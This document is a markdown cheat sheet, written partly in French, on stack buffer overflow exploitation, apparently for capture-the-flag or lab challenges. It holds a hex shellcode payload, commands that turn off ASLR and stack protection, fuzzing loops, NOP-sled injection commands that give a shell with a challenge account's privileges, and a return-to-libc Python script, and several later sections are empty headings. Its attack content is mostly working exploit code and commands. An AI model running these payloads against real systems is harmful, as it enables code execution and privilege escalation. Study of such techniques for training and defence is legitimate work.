# Buffer overflow

</br>

## Tools

* Plugin pour gdb : https://github.com/longld/peda
* string xxx
* test eax, eax : caracteristique des comparaisons de strings
* objdump -D buffer_01
* strace
* pmap `pidof xxx`
* PwnTools 
* /usr/share/metasploit-framework/tools/exploit/pattern create.rb -l 2000
* /usr/share/metasploit-framework/tools/exploit/pattern offset.rb -q 0x41424344

</br>

### Payloads

#### dash
````
"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
````

</br>

### Disable securities

gcc -fno-stack-protector -z execstack 
Disable ASLR for one binary : setarch `uname -m` -R /root/mybinary
Disable ASLR for the session : echo 0 > /proc/sys/kernel/randomize_va_space
0: off
1: on
2: on (default value)
Disable ASLR:
sysctl -w kernel.randomize_va_space=0 in /etc/sysctl.conf

gcc -m32

</br>

### gdb

#### Find system address

* source /usr/share/gdb-peda/peda.py
* r
* print system
* find "/bin/sh" all


</br>

## Simple buffer overflow : overwrite a stack variable

````
$ cat buffer_01.c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
  char  tst=0;
  char name[10];

  strcpy(name, argv[1]);
  printf("Hello %s\n", name);
  if (tst=='Z') printf("Pwnd");
  return 0;
}
$ gcc -fno-stack-protector buffer_01.c -o buffer_01
$ buffer_01 ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
````

</br>

## Internal function call

On regarde les fonctions et leurs adresses
````
$ objdump -D ./strcpy
08048533 <get_flag_1>:
 8048533:	55                   	push   %ebp
 8048534:	89 e5                	mov    %esp,%ebp
 8048536:	83 ec 08             	sub    $0x8,%esp
 8048539:	83 ec 0c             	sub    $0xc,%esp
 804853c:	68 20 86 04 08       	push   $0x8048620
 8048541:	e8 1a fe ff ff       	call   8048360 <system@plt>
 8048546:	83 c4 10             	add    $0x10,%esp
 8048549:	c9                   	leave
 804854a:	c3                   	ret

0804854b <get_flag_2>:
 804854b:	55                   	push   %ebp
 804854c:	89 e5                	mov    %esp,%ebp
 804854e:	83 ec 08             	sub    $0x8,%e
````
get_flag_2 est en 0804854b, on va pousser 0804854b en bout de notre fuzzer, et le faire glisser jusqu'à ce qu'il tombe sur EIP et appelle la fonction get_flag_2
````
$ for i in `seq 1 100`;do echo $i; ./strcpy $(python -c "print 'a'*$i+'\x4b\x85\x04\x08';"); done
````

</br>

## Execute stack payload : before ESP

Context:
- Executable stack
- No canary
- No Address Space Layout Randomization
=> Adresses are hard coded in elf

gcc -z execstack 


Detection à la louche de l'overflow en shell
````
$ for i in `seq 500 510`;do echo $i; ./vuln_basic $(python -c "print 'a'*$i;"); done
````

Detection fine de la position dans gdb
````
gdb
disassemble main
break *0x0804844e
gdb-peda$ run $(python -c "print 'a'*512+'bcdefghijklmnopqrst';")
Stopped reason: SIGSEGV
0x65646362 in ?? ()
=> bcde
gdb-peda$ x/520x $esp
````

On dispose de 512 octets. On va utiliser (512-48) NOP et une payload de 48 octets suivi d'une adresse 1234.
````
 run $(python -c 'print "\x90"*(512-48)+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x01\x02\x03\x04";')
 ````
On vérifie que EIP vaut bien 4x3x2x1
On cherche avec x/520x $esp une adresse dans les nop
"bffffd50"
On l'inverse
"\x50\xfd\xff\xbf" 

On quitte gdb et on fait en shell
````
./vuln_basic  $(python -c 'print "\x90"*(512-48)+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x50\xfd\xff\xbf";')
$ id
uid=1001(user) gid=1001(user) euid=1000(chall) groups=1001(user)
````

</br>

## Execute stack payload : after ESP


On se le refait mais avec la payload après EIP
````
./vuln_basic  $(python -c 'print "\x90"*(512)+"\xc8\xfd\xff\xbf"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81";')
````

</br>

## Stack/Heap non executable -> return to LibC

```
#!/usr/bin/python
import os
import struct

libc_system = struct.pack('<I', 0xaeaeaeae)
libc_binsh  = struct.pack('<I', 0xaeaeaeae)

buffer  = 'A'*64
buffer += libc_system
buffer += 'AAAA'
buffer += libc_binsh

progname ="./buffer_01"
os.environ['VAR']=buffer
os.execve(progname, [progname], os.environ)

````

</br>

## Hide LibC adresse ALSR 32 bits -> bruteforce search 



</br>

## Hide LibC adresse ALSR 64 bits -> information leak (format string vuln)


</br>

## LibC hidden -> Return Oriented Program (ROP)

https://github.com/0vercl0k/rp

</br>

## Randomize location of code -> Blind ROP

[http://www.scs.stanford.edu/brop/]












